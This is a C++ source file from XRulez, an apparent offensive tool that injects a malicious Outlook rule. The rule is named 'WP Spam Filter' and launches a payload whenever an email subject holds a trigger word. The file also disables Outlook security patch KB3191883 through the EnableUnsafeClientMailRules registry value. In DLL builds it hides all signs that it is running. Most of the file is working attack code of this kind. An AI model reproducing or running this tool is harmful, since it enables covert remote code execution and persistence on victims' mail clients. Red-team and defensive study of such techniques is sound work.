#include "StdAfx.h"

// Codebox includes.
#include "Application.h"
#include "Resource.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
XRulez::Application::Application()
{
	// Settings used by both XRulezExe and XRulezDll.
	m_ProfileName = TEXT("");													//< Outlook profile name used to log in. Leave it blank to use default profile name.
	m_RuleName = L"WP Spam Filter";												//< This name will be seen on Outlook's rule list.
	m_TriggerText = L"spam";													//< Text in email subject that triggers payload launching.
	m_RulePayloadPath = LR"(C:\ABC\Repos\Dev\Src\Sandboxes\1_1209814781.lnk)";	//< Path to payload.
	m_IsRunningInWindowsService = false;										//< Should be true if run as (or injected to) a Windows Service. @see MAPIInitialize on MSDN.

	// Used only by XRulezDll.
	m_IsRunningInMultithreadedProcess = false;									//< Should be set to true if injected to multi-threaded process. @see MAPIInitialize on MSDN.

	// Assertions.
	CHECK(m_ProfileName.size() <= 65);
	CHECK(m_RuleName.size() <= 255);
	CHECK(m_TriggerText.size() <= 255);
	CHECK(m_RulePayloadPath.size() <= 255);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::Process()
{
	// The "Big Outer Try Block". We want to filter out all unhandled exceptions before they reach the operating system/host app (which would probably end up showing crash-postmortem dialog to the user).
	try
	{
		// Show some text on the screen.
		Comment(APPLICATION_NAME);

		// Validate and resolve (compilation) command-line parameters. This will be also used by XRulezBuilder.
		if (!ProcessInputParameters())
			return false;
	}
	// Let's just show XException::what() to the user.
	catch (CppTools::XException& e)
	{
		CommentError(TEXT("Caught an unhandled exception. ") + CppTools::StringConversions::Mbcs2Tstring(e.what()) + TEXT("\n") + e.ComposeFullMessage());
	}
	// Catch all unhandled exceptions. We need to show no symptoms of running (especially when in a DLL).
	catch (...)
	{
		CommentError(TEXT("Caught an unhandled exception."));
	}

	// Return success.
	return true;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::ProcessInputParameters()
{
	// Update source-code-defined default values with compilation command-line values. This will be also used by XRulezBuilder.
	ProcessPreprocessorParameters();

	// If we're on the DLL, update values with those in string table.
	if (Enviro::IsDllBuild)
	{
		DllProcessStringTableParameters();
		PerformInjection();
		return true;
	}
	else
	{
		// Process executable's input.
		return ExeProcessParameters();
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::DllProcessStringTableParameters()
{
	// If any of following string table entries exists, load it, validate it and use it's value rather than the one assigned before. First byte indicates if value is utilized or not.
	wchar_t buffer[260];
#	define LOAD_STRING(KEY,VAR) if (LoadStringW(*Enviro::AccessDllInstance(), KEY, buffer, static_cast<int>(std::size(buffer))) && buffer[0] == L'1' && wcslen(buffer) < 256) VAR = &buffer[1];
#	if defined _UNICODE
		LOAD_STRING(IDS_STRING_PROFILE_NAME, m_ProfileName);
#	else
		if (LoadStringW(*Enviro::AccessDllInstance(), IDS_STRING_PROFILE_NAME, buffer, static_cast<int>(std::size(buffer))) && buffer[0] == L'1' && wcslen(buffer) < 256) m_ProfileName = CppTools::StringConversions::Unicode2Tstring(&buffer[1]);
#	endif
	LOAD_STRING(IDS_STRING_RULE_NAME, m_RuleName);
	LOAD_STRING(IDS_STRING_TRIGGER_TEXT, m_TriggerText);
	LOAD_STRING(IDS_STRING_PAYLOAD_PATH, m_RulePayloadPath);
#	undef LOAD_STRING

	// Lastly load and parse bool value. Again, first byte indicates if value is utilized or not.
	if (LoadStringW(*Enviro::AccessDllInstance(), IDS_STRING_RUNNING_AS_WINDOWS_SERVICE, buffer, static_cast<int>(std::size(buffer))) && buffer[0] == L'1')
		m_IsRunningInWindowsService = (buffer[1] == L'1');
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ProcessPreprocessorParameters()
{
	// If any of following preprocessor definition exists, validate it and use it's value rather than the one assigned in the constructor.
#	if defined(RULE_NAME)
	m_RuleName = WSTRINGITIZE(RULE_NAME);
	static_assert(sizeof(WSTRINGITIZE(RULE_NAME)) AND sizeof(WSTRINGITIZE(RULE_NAME)) < 256, "If defined, RULE_NAME compilation param has to be non blank and less than 256 characters long.");
#	endif
#	if defined(RULE_TRIGGER)
	m_TriggerText = WSTRINGITIZE(RULE_TRIGGER);
	static_assert(sizeof(WSTRINGITIZE(RULE_TRIGGER)) AND sizeof(WSTRINGITIZE(RULE_TRIGGER)) < 256, "If defined, RULE_TRIGGER compilation param has to be non blank and less than 256 characters long.");
#	endif
#	if defined(PROFILE_NAME)
	m_ProfileName = WSTRINGITIZE(PROFILE_NAME);
	static_assert(sizeof(WSTRINGITIZE(PROFILE_NAME)) AND sizeof(WSTRINGITIZE(PROFILE_NAME)) < 256, "If defined, PROFILE_NAME compilation param has to be non blank and less than 256 characters long.");
#	endif
#	if defined(PAYLOAD_PATH)
	m_RulePayloadPath = WSTRINGITIZE(PAYLOAD_PATH);
	static_assert(sizeof(WSTRINGITIZE(PAYLOAD_PATH)) AND sizeof(WSTRINGITIZE(PAYLOAD_PATH)) < 256, "If defined, PAYLOAD_PATH compilation param has to be non blank and less than 256 characters long.");
#	endif
#	if defined(IS_RUNNING_IN_WINDOWS_SERVICE)
	m_IsRunningInWindowsService = IS_RUNNING_IN_WINDOWS_SERVICE;
#	endif
	// This switch has no effect when running in an executable.
#	if defined(IS_RUNNING_IN_MULTITHREADED_PROCESS)
	m_IsRunningInMultithreadedProcess = IS_RUNNING_IN_MULTITHREADED_PROCESS;
#	endif
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::ExeProcessParameters()
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return false;

	// Access command line params.
	auto& commandLineArgs = Enviro::AccessCommandLineParams();

	// Sanity validation.
	if (commandLineArgs.size() < 2 || commandLineArgs[1].size() != 2 || commandLineArgs[1][0] != TEXT('-'))
		return ExeShowUsage(true), false;

	// Handle commands separately.
	switch (commandLineArgs[1][1])
	{
	case TEXT('l'):																//< Display a list of available MAPI profiles.
		return ExeListOutlookProfiles(), false;

	case TEXT('r'):																//< Disable security patch KB3191883.
		return ExeDisableSecurityPatchKB3191883();

	case TEXT('a'):																//< Process command line values, validate them and proceed to message injection.
		return ExeProcessCommandLineValues() && PerformInjection();

	case TEXT('d'):																//< Display parameters default (precompiled) values.
		return ExeShowDefaultParamsValues(), false;

	case TEXT('i'):																//< Perform interactive configuration and proceed to message injection.
		return ExePerformInteractiveConfiguration(), true;

	case TEXT('h'):																//< Display help.
		return ExeShowUsage(false), false;

	case TEXT('o'):																//< Check if Outlook is running at the moment.
		return ExeCheckIfOutlookIsRunning(), false;

	default:																	//< Wrong input.
		return ExeShowUsage(true), false;
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ExeShowDefaultParamsValues()
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return;

	// m_RuleName, m_TriggerText and m_RulePayloadPath are wide strings, independently of configuration. m_ProfileName is a configuration-dependent string.
	Enviro::tcout << TEXT("Default (precompiled) values:\nProfile = ") << m_ProfileName.c_str();
	Enviro::wcout << L"\nRule name = " << m_RuleName << L"\nTrigger text = " << m_TriggerText << L"\nPayload path = " << m_RulePayloadPath << L"\nRunning in a Windows service = " <<
		(m_IsRunningInWindowsService ? L"true" : L"false") << std::endl << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::Comment(const std::tstring& comment)
{
	if (!Enviro::IsDllBuild)
		Enviro::tcout << comment.c_str() << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::CommentError(const std::tstring& error)
{
	if (!Enviro::IsDllBuild)
		Enviro::tcerr << error.c_str() << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ReportError(const std::tstring& functionName, HRESULT hresult)
{
	if (!Enviro::IsDllBuild)
		Enviro::tcerr << functionName.c_str() << TEXT("() has returned error ") << WinTools::ConvertHresultToMessageWithHresult(hresult).c_str() << std::endl << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ReportError(const std::tstring& functionName, const std::tstring& enumName, HRESULT hresult)
{
	if (!Enviro::IsDllBuild)
		Enviro::tcerr << functionName.c_str() << TEXT("() has returned error ") << enumName.c_str() << TEXT(" ") << WinTools::ConvertHresultToMessageWithHresult(hresult).c_str() << std::endl << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ExeCheckIfOutlookIsRunning()
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return;

	// First method - search for Outlook process.
	Enviro::cout << "Searching for Outlook process..." << std::endl;
	auto xeIsOutlookProcessRunning = MapiTools::IsOutlookProcessRunning();
	if (xeIsOutlookProcessRunning.IsSuccess())
		Enviro::cout << "Outlook process is " << (xeIsOutlookProcessRunning.GetResult() == CppTools::EYesNoMaybe::No ? "not " : "") << "running.\n" << std::endl;
	else
	{
		// Handle error displaying.
		std::cerr << "Couldn't resolve if Outlook process is running." << std::endl;
		switch (xeIsOutlookProcessRunning.GetEnumerateProcessResult()->GetApiCall())
		{
			// Use simple macro to DRY.
#			define CASE(x) case x: ReportError(TEXT("MapiTools::IsOutlookProcessRunning"), TEXT(#x), xeIsOutlookProcessRunning.GetEnumerateProcessResult()->GetHresult()); break;
			CASE(WinTools::EnumerateProcessesRet::CreateToolhelp32Snapshot)
			CASE(WinTools::EnumerateProcessesRet::Process32First)
			CASE(WinTools::EnumerateProcessesRet::Process32Next)
#			undef CASE
		}
	}

	// Second method - try to get Outlook's CLSID active object.
	Enviro::cout << "Trying to get Outlook's CLSID active object..." << std::endl;

	// Initialize MapiTools Module.
	auto xe = MapiTools::InitializeMapi(m_IsRunningInMultithreadedProcess, m_IsRunningInWindowsService);
	if (xe.IsFailure())
		return ReportError(TEXT("MapiTools::InitializeMapi"), xe);
	SCOPE_GUARD{ MapiTools::UninitializeMapi(); };

	// Initialize COM.
	auto hr = ::CoInitialize(nullptr);
	if (FAILED(hr))
		return ReportError(TEXT("::CoInitialize"), xe);
	SCOPE_GUARD{ ::CoUninitialize(); };

	// Finally call the MapiTools::IsOutlookRunning().
	auto xeIsOutlookRunning = MapiTools::IsOutlookRunning();
	switch (xeIsOutlookRunning->GetHresult())
	{
		case MK_E_UNAVAILABLE: Enviro::cout << "Outlook object is not active.\n" << std::endl; break;
		case S_OK: Enviro::cout << "Outlook object is active.\n" << std::endl; break;
		default:
			Enviro::cout << "" << std::endl;
			ReportError(TEXT("Couldn't resolve if Outlook object is active. MapiTools::IsOutlookRunning"), xeIsOutlookRunning->GetApiCall() == MapiTools::IsOutlookRunningRet::CLSIDFromProgID ?
				TEXT("MapiTools::IsOutlookRunningRet::CLSIDFromProgID") : TEXT("MapiTools::IsOutlookRunningRet::GetActiveObject"), xeIsOutlookRunning->GetHresult());
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ExeShowUsage(bool error)
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return;

	// Slightly change the messge and use std::terr instead of Enviro::tcout if error param is set.
	(error ? Enviro::tcerr : Enviro::tcout) << (error ? TEXT("Wrong input") : APPLICATION_NAME) << TEXT(". Usage:")
		TEXT("\n\nXRulez.exe [-h]")
		TEXT("\n\tDisplays help/usage.")

		TEXT("\n\nXRulez.exe -l")
		TEXT("\n\tDisplays a list of MAPI profiles installed on the system.")

		TEXT("\n\nXRulez.exe -d")
		TEXT("\n\tDisplays parameters default (precompiled) values.")

		TEXT("\n\nXRulez.exe -a [--profile PROFILE] [--name NAME] [--trigger TRIGGER] [--payload PAYLOAD]")
		TEXT("\n\tCreates and adds a new Exchange rule. Default, built-in values (use -d to see them) are used for all omitted params. If profile name is blank then default Outlook profile will be used. Other params must not be blank.")

		//TEXT("\n\nXRulez.exe -p")
		//TEXT("\n\tChecks if EnableUnsafeClientMailRules security patch KB3191883 for Outlook 2013 and 2016.")

		TEXT("\n\nXRulez.exe -r")
		TEXT("\n\tDisables security patch KB3191883 (re-enables run-actions for Outlook 2010, 2013 and 2016).")

		TEXT("\n\nXRulez.exe -i")
			TEXT("\n\tPerforms an interactive configuration and proceeds to message injection.")

		TEXT("\n\nXRulez.exe -o")
			TEXT("\n\tCheck it Outlook is running at the moment.\n") << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ExePerformInteractiveConfiguration()
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return;

	// Helper lambda used to get one single input wide string param.
	auto GetInputParam = [](const std::string& paramName, OUT std::wstring& paramVariable)
	{
		while (true)
		{
			Enviro::cout << "Enter " << paramName.c_str() << " : ";

#			ifdef UNICODE
				getline(Enviro::wcin, paramVariable);
#		else
				std::string temp;
				getline(Enviro::cin, temp);
				paramVariable = CppTools::StringConversions::Mbcs2Unicode(temp);
#		endif

			// Validation.
			if (paramVariable.empty())
				Enviro::wcerr << L"Parameter " << paramName.c_str() << L"must not be blank.\n\n";
			else if (paramVariable.size() > 255)
				Enviro::wcerr << L"Parameter " << paramName.c_str() << L"must be shorter than 256 characters.\n\n";
			else
				return;
		}
	};

	// Retrieve profile name, which is TCHAR string.
	Enviro::cout << "Interactive configuration.\nEnter profile name. Leave it blank to use default Outlook profile : ";
	getline(Enviro::tcin, m_ProfileName);

	// Rule name, trigger text and payload path are always UNICODE strings regardless of configuration. Retrieve them using helper lambda defined above.
	GetInputParam("rule name", m_RuleName);
	GetInputParam("trigger text", m_TriggerText);
	GetInputParam("payload path", m_RulePayloadPath);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRulez::Application::ExeListOutlookProfiles()
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return;

	// Resolve profile list from Outlook profile files.
	Enviro::cout << "\nList of Outlook profile files:\n";

	auto xeEnumerateProfileFiles = MapiTools::EnumerateProfileFiles([](void*, const WIN32_FIND_DATAW& fileData) -> bool { Enviro::wcout << std::wstring(fileData.cFileName).substr(0, wcslen(
		fileData.cFileName) - 4) << L"\tLast Accessed " << (time(nullptr) - WinTools::ConvertFileTimetoLonglong(fileData.ftLastWriteTime)) / 60 << " minutes ago." << std::endl; return true; }, nullptr);
	if (xeEnumerateProfileFiles.IsFailure())
	{
		// Handle error displaying.
		Enviro::cerr << "Failed to enumerate profile files." << std::endl;
		switch (xeEnumerateProfileFiles->GetApiCall())
		{
			// Use simple macro to DRY.
#			define CASE(x) case x: ReportError(TEXT("MapiTools::EnumerateProfileFiles"), TEXT(#x), xeEnumerateProfileFiles->GetHresult()); break;
			CASE(MapiTools::EnumerateProfileFilesRet::GetAppDataFolder)
				CASE(MapiTools::EnumerateProfileFilesRet::PathAppend)
				CASE(MapiTools::EnumerateProfileFilesRet::EnumerateFiles_FindFirstFileW)
				CASE(MapiTools::EnumerateProfileFilesRet::EnumerateFiles_FindNextFileW)
#			undef CASE
		}
	}

	// Resolve profile list from MAPI.
	Enviro::cout << "List of Outlook profiles:\n";

	// Initialize MapiTools Module.
	auto xeInitializeMapi = MapiTools::InitializeMapi(m_IsRunningInMultithreadedProcess, m_IsRunningInWindowsService);
	if (xeInitializeMapi.IsFailure())
		return ReportError(TEXT("MapiTools::InitializeMapi"), xeInitializeMapi);

	SCOPE_GUARD{ MapiTools::UninitializeMapi(); };

	// Call MapiTools::EnumerateProfilesMapi.
	auto xeEnumerateProfilesMapi = MapiTools::EnumerateProfilesMapi([](void*, const char profileName[MAX_PATH], bool isDefaultProfile) -> bool
		{ Enviro::cout << profileName << (isDefaultProfile ? "\t(default profile)" : "") << std::endl; return true; }, nullptr);
	if (xeEnumerateProfilesMapi.IsFailure())
	{
		// Handle error displaying.
		Enviro::cerr << "Failed to enumerate profiles." << std::endl;
		switch (xeEnumerateProfilesMapi->GetApiCall())
		{
			// Use simple macro to DRY.
#			define CASE(x) case x: ReportError(TEXT("MapiTools::EnumerateProfilesMapi"), TEXT(#x), xeEnumerateProfilesMapi->GetHresult()); break;
			CASE(MapiTools::EnumerateProfilesMapiRet::AdminProfiles)
			CASE(MapiTools::EnumerateProfilesMapiRet::GetProfileTable)
			CASE(MapiTools::EnumerateProfilesMapiRet::GetRowCount)
			CASE(MapiTools::EnumerateProfilesMapiRet::QueryRows)
#			undef CASE
		}
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::ExeProcessCommandLineValues()
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return false;

	// Access command line params.
	auto& commandLineArgs = Enviro::AccessCommandLineParams();

	// Sanity validation.
	if (commandLineArgs.size() % 2)
		return ExeShowUsage(true), false;

	// Handle commands separately.
	for (unsigned i = 2; i < commandLineArgs.size(); i += 2)
		if (!ExeHandleSingleCommand(commandLineArgs[i], commandLineArgs[i + 1]))
			return false;

	// Return true if everything went right.
	return true;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::PerformInjection()
{
	try
	{
		// Show some text on the screen.
		Comment(TEXT("Performing injection..."));

		// Create and inject malicious rule.
		MapiTools::CallKernelOnInboxFolder<void>(m_IsRunningInMultithreadedProcess, m_IsRunningInWindowsService, !Enviro::IsDllBuild, m_ProfileName,
			[&](MapiTools::MapiFolder const& inboxFolder) { inboxFolder.InjectXrule(m_RuleName, m_TriggerText, m_RulePayloadPath); });

		// Comment and terminate.
		Comment(TEXT("Injection successful.\n"));
		return true;
	}
	// Let's just show XException::what() to the user.
	catch (CppTools::XException& e)
	{
		CommentError(TEXT("Failed to inject rule.\n") + CppTools::StringConversions::Mbcs2Tstring(e.what()) + TEXT("\n") + e.ComposeFullMessage());
	}
	catch (...)
	{
		CommentError(TEXT("Failed to inject rule.\nCaught an unhandled exception."));
	}

	return false;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::ExeDisableSecurityPatchKB3191883()
{
	auto DisablePathForOutlookVersion = [](std::wstring const& registyKey, std::tstring const& outlookVersionName)
	{
		if (auto hr = WinTools::Registry::SetValue(WinTools::Registry::HKey::CurrentUser, registyKey, L"EnableUnsafeClientMailRules", 1))
			return Enviro::tcerr << TEXT("[-] Couldn't re-enable run-actions for ") << CppTools::StringConversions::Convert<std::tstring>(outlookVersionName.c_str()) << TEXT(". ")
				<< WinTools::ConvertHresultToMessageWithHresult(hr).c_str() << std::endl << std::endl, false;
		
		return true;
	};

	Comment(TEXT("Disabling security patch for Outlook 2010, 2013 and 2016..."));
	auto success = DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\14.0\Outlook\Security)", TEXT("Outlook 2010"))
		&& DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\15.0\Outlook\Security)", TEXT("Outlook 2013"))
		&& DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\16.0\Outlook\Security)", TEXT("Outlook 2016"));

	Comment(TEXT("Done.\n"));
	return success;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool XRulez::Application::ExeHandleSingleCommand(const std::tstring& commandKey, const std::tstring& commandValue)
{
	// This function should not be called in DLL builds.
	CHECK(!Enviro::IsDllBuild);
	if (Enviro::IsDllBuild)
		return false;

	// Handle one single command-line command.
	if (!commandKey.compare(TEXT("--profile")))
		if (commandValue.size() > 65)											//< Validate.
			return Enviro::cerr << "Error: profile name has to be less than 256 characters long." << std::endl, false;
		else
			return m_ProfileName = commandValue, true;

	// For other cases, use simple macro (DRY).
#	define ELSE(text,name,var) else if (!commandKey.compare(TEXT(text))) if (commandValue.size() > 255) return Enviro::cerr << "Error: " name " has to be less than 256 characters long." << std::endl, \
		false; else if (commandValue.empty()) return Enviro::cerr << "Error: " name " has to be non-blank." << std::endl, false; \
		else return var = CppTools::StringConversions::Tstring2Unicode(commandValue), true;
	ELSE("--name", "rule name", m_RuleName)
	ELSE("--trigger", "trigger text", m_TriggerText)
	ELSE("--payload", "payload path", m_RulePayloadPath)
#	undef ELSE

	// If we're here then an unknown command was used. Show usage and terminate.
	return ExeShowUsage(true), false;
};
